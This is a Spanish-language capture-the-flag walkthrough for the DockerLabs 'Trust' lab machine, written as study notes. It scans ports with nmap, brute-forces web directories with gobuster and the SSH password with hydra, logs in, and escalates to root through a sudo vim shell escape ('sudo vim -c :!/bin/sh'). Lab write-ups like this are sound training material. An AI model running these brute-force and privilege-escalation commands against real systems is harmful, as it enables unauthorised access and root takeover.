Máquina Trust (Nivel Muy Fácil) -> DockerLabs

----

1. Desplegamos la máquina
```
sudo bash auto_deploy.sh trust.tar
```
![[Pasted image 20240511192832.png]]

2. Escaneo de puertos
```
sudo nmap -p- --open -sC -sS -sV -min-rate-5000 -n -vvv -Pn 172.17.0.2
```
![[Pasted image 20240511193221.png]]
	- Port 22 -> ssh
	- Port 80 -> http

3. Visitamos la página web
![[Pasted image 20240511193514.png]]

4. Buscamos directorios ocultos
```
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```
![[Pasted image 20240511194119.png]]

5. Buscamos por extensiones específicas
```
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,html
```
![[Pasted image 20240511194254.png]]

6. Entramos a secret.php
![[Pasted image 20240511194334.png]]

7. Usamos hydra para la entrada fuerza bruta al ssh
```
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```
![[Pasted image 20240511195403.png]]

8. Iniciamos ssh con las credenciales encontradas
```
ssh mario@172.17.0.2
```

![[Pasted image 20240511195501.png]]
9. Buscamos alcanzar ser root
![[Pasted image 20240511195611.png]]

10. Explotación a través de vim
```
sudo vim -c ':!/bin/sh'
```

Este comando específico se utiliza para ejecutar un comando de shell desde el editor de texto con privilegios elevados.

![[Pasted image 20240511195811.png]]
